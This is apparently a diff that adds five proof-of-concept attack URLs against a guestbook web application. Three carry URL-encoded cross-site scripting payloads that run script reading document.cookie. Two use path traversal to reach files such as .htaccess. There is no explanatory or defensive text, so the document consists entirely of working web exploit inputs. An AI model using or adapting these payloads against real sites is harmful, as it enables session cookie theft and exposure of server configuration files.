@@ -1,0 +1,5 @@
+http://www.example.com/path_to_firebook_admin/?URLproxy=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/guestbook/index.html?answer=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/guestbook/index.html?answer=guestbook/guest/file.html;page=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/path_to_firebook_admin/?param=1;show=../.htaccess;
+http://www.example.com/guestbook/index.html?answer=guestbook/guest/%2E%2E/index.html
